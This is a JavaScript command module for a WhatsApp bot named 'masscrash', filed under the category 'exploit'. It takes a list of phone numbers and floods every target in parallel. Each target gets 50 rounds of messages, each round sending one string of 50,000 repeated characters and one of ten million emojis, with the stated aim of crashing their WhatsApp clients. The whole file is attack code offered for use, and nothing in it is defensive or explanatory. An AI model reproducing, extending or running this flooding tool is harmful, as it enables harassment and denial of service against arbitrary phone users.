// commands/masscrash.js - Mass WhatsApp Crash
module.exports = {
    name: 'masscrash',
    aliases: ['mc'],
    description: 'Crash multiple WhatsApp numbers at once',
    category: 'exploit',
    ownerOnly: true,
    adminOnly: false,
    async execute(bot, msg, args) {
        if (args.length === 0) {
            await bot.sock.sendMessage(msg.key.remoteJid, {
                text: '❌ Provide numbers to crash!\nUsage: .masscrash +1234567890 +9876543210'
            });
            return;
        }

        const numbers = args.map(n => n.replace(/[^0-9+]/g, ''));
        const validNumbers = numbers.filter(n => n.startsWith('+'));
        
        if (validNumbers.length === 0) {
            await bot.sock.sendMessage(msg.key.remoteJid, {
                text: '❌ No valid numbers provided! Use +[countrycode][number]'
            });
            return;
        }

        await bot.sock.sendMessage(msg.key.remoteJid, {
            text: `🔥 MASS CRASH INITIATED!\n` +
                  `📱 Targets: ${validNumbers.length} numbers\n` +
                  `⏳ Starting attack on all targets...`
        });

        // Run parallel attacks
        const promises = validNumbers.map(number => {
            return executeCrash(bot, msg, number);
        });

        await Promise.allSettled(promises);

        await bot.sock.sendMessage(msg.key.remoteJid, {
            text: `✅ MASS CRASH COMPLETED!\n` +
                  `📊 Total targets: ${validNumbers.length}\n` +
                  `💥 All targets should be affected`
        });
    }
};

async function executeCrash(bot, msg, number) {
    try {
        const jid = number + '@s.whatsapp.net';
        
        // Rapid message flooding
        for (let i = 0; i < 50; i++) {
            try {
                await bot.sock.sendMessage(jid, {
                    text: Buffer.from('A'.repeat(50000)).toString()
                });
            } catch (e) {}
            
            try {
                await bot.sock.sendMessage(jid, {
                    text: '😀'.repeat(10000000)
                });
            } catch (e) {}
        }
        
        return { number, status: 'crashed' };
    } catch (error) {
        return { number, status: 'failed', error: error.message };
    }
}